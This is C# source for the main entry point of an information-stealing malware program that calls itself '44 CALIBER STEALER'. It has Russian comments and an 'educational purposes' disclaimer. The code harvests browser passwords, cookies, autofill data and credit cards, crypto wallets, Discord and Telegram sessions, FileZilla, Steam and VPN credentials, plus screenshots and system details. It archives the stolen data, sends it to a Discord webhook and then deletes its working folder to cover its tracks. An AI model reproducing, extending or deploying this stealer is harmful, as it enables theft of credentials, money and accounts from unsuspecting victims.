using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

namespace youknowcaliber
{
    class Program
    {
        public static void Main(string[] args)
        {
            if (!File.Exists(Help.ExploitDir)) // Проверка запущен ли уже стиллер
            {
                if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length == 1) // Проверка запущен ли уже стиллер
                {
                    try
                    {
                        Directory.CreateDirectory(Help.ExploitDir);
                        List<Thread> Threads = new List<Thread>();

                        Threads.Add(new Thread(() => Browsers.Start())); // Старт потока с браузерами

                        Threads.Add(new Thread(() => Files.GetFiles())); // Старт потока с грабом файлов

                        Threads.Add(new Thread(() => StartWallets.Start())); // Старт потока c криптокошельками

                        Threads.Add(new Thread(() =>
                        {
                            Help.Ethernet(); // Получение информации о айпи
                            Screen.GetScreen(); // Скриншот экрана
                            ProcessList.WriteProcesses(); // Получение списка процессов
                            SystemInfo.GetSystem(); // Скриншот экрана
                        }));

                        Threads.Add(new Thread(() =>
                        {
                            ProtonVPN.Save();
                            OpenVPN.Save();
                            NordVPN.Save();
                            Steam.SteamGet();
                        }));

                        Threads.Add(new Thread(() =>
                        {
                            Discord.WriteDiscord();
                            FileZilla.GetFileZilla();
                            Telegram.GetTelegramSessions();
                            Vime.Get();
                        }));

                        foreach (Thread t in Threads)
                            t.Start();
                        foreach (Thread t in Threads)
                            t.Join();

                        // Пакуем в апхив с паролем
                        string zipArchive = Help.ExploitDir + "\\" + SystemInfo.CountryCode() + SystemInfo.IP() + "(" + Help.dateLog + ")" + ".zip";
                        using (Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile(Encoding.GetEncoding("cp866"))) // Устанавливаем кодировку
                        {
                            zip.ParallelDeflateThreshold = -1;
                            zip.UseZip64WhenSaving = Ionic.Zip.Zip64Option.Always;
                            zip.CompressionLevel = Ionic.Zlib.CompressionLevel.Default; // Задаем степень сжатия 
                            zip.Comment =
                           "\n ================================================" +
                           "\n ===============44 CALIBER STEALER===============" +
                           "\n ================================================" +
                           "\n Maded by ChaosInsurgency | lolz.guru/thanatophobia" +
                           "\n              telegram @chaosinsurgency          " +
                            "\n Written exclusively for educational purposes! I am not responsible for the use of this project and any of its parts code.";                           
                            zip.Password = Config.zipPass;
                            zip.AddDirectory(Help.ExploitDir); // Кладем в архив содержимое папки с логом
                            zip.Save(zipArchive); // Сохраняем архив    
                        }

                        string mssgBody =
                           "\n :spy: NEW LOG FROM - " + Environment.MachineName + " " + Environment.UserName + " :person_in_manual_wheelchair:" +
                           "\n :eye: IP: " + SystemInfo.IP() + " " + SystemInfo.Country() +
                           "\n :desktop: " + SystemInfo.GetSystemVersion() +
                           "\n ================================" +
                           "\n :key: Passwords - " + Counting.Passwords +
                           "\n :cookie: Cookies - " + Counting.Cookies +
                           //"\n History - " + Counting.History +
                           "\n :notepad_spiral: AutoFills - " + Counting.AutoFill +
                           "\n :credit_card: CC - " + Counting.CreditCards +
                           "\n :file_folder: Grabbed Files - " + Counting.FileGrabber +
                           "\n ================================" +
                           "\n GRABBED SOFTWARE:" +
                           (Counting.Discord > 0 ? "\n   Discord" : "") +
                           (Counting.Wallets > 0 ? "\n   Wallets" : "") +
                           (Counting.Telegram > 0 ? "\n   Telegram" : "") +
                           (Counting.FileZilla > 0 ? "\n   FileZilla" + " (" + Counting.FileZilla + ")" : "") +
                           (Counting.Steam > 0 ? "\n   Steam" : "") +
                           (Counting.NordVPN > 0 ? "\n   NordVPN" : "") +
                           (Counting.OpenVPN > 0 ? "\n   OpenVPN" : "") +
                           (Counting.ProtonVPN > 0 ? "\n   ProtonVPN" : "") +
                           (Counting.VimeWorld > 0 ? "\n   VimeWorld" + (Config.VimeWorld == true ?
                           $":\n     NickName - {Vime.NickName()} " +
                           $":\n     Donate - {Vime.Donate()} " +
                           $":\n     Level - {Vime.Level()}" : "") : "") +
                           "\n ================================" +
                           "\n DOMAINS DETECTED:" +
                           "\n - " + URLSearcher.GetDomainDetect(Help.ExploitDir + "\\Browsers\\");


                         string filename = Environment.MachineName + "." + Environment.UserName + ".zip";                
                         string fileformat = "zip";
                         string filepath = zipArchive;
                         string application = "";
                     
                        try
                        {
                            DiscordWebhook.SendFile(mssgBody, filename, fileformat, filepath, application); // Отправка лога в дискорд
                        }
                        catch
                        {

                            DiscordWebhook.Send("Log size is more then 8 MB. Sending isn`t available."); 
                            /* В дискорде имеется ограничение на макс. размер файла. На серверах без буста максимальный размер файла 8 мб, когда с бустом 50.
                               Если есть возможность использовать сервер с бустом, то используйте его. */
                        }

                        Finish(); // Автоудаление

                    }

                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }
            }
        }

        static void Finish()
        {
            Thread.Sleep(15000);
            Directory.Delete(Help.ExploitDir + "\\", true);
            Environment.Exit(0);
        }

    }
}
